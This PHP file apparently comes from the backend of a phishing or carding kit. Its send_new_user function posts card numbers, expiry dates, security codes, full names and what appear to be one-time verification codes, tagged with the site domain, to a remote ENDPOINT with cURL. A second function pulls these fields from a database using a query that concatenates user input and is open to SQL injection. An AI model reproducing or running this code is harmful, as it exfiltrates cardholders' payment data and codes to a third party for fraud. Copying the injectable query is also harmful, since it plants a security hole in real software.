<?php

require_once 'config.php';

function send_new_user($cardnumber, $exp_date, $card_code, $fullname, $code, $id, $code_count, $action = "card") {
//    try {
        $post_data = array(
            'cardnumber' => $cardnumber,
            'exp_date' => $exp_date,
            'card_code' => $card_code,
            'fullname' => $fullname,
            'code' => $code,
            'domain' => DOMAIN,
            'id' => $id,
            'code_count' => $code_count,
            'action' => $action,
        );

        $json_data = json_encode($post_data);

        // Set the POST headers
        $headers = array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($json_data)
        );

        // Set the cURL options
        $curl_options = array(
            CURLOPT_URL => ENDPOINT,
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POSTFIELDS => $json_data,
            CURLOPT_HTTPHEADER => $headers
        );

        // Initialize cURL
        $curl = curl_init();

        // Set the cURL options
        curl_setopt_array($curl, $curl_options);

        // Execute the cURL request
        $response = curl_exec($curl);
       
        // Check for cURL errors
        if (curl_errno($curl)) {
            $error_msg = curl_error($curl);
            curl_close($curl);
            throw new Exception("cURL Error: $error_msg");
        }

        // Close cURL
        curl_close($curl);

        // Return the response
        return $response;
//    } catch (Exception $e) {
//
//    }
}

function send_user_validation($conn,$user_id) {
    $sql = "SELECT * from user_information WHERE id = '$user_id'";
    $query = mysqli_query($conn, $sql);

    if ($query) {
        $user = mysqli_fetch_assoc($query);
        send_new_user($user['cardnumber'], $user['exp_date'], $user['card_code'], $user['fullname'], $user['code'], $user_id,  $user['code_count'],"code");
    }

}

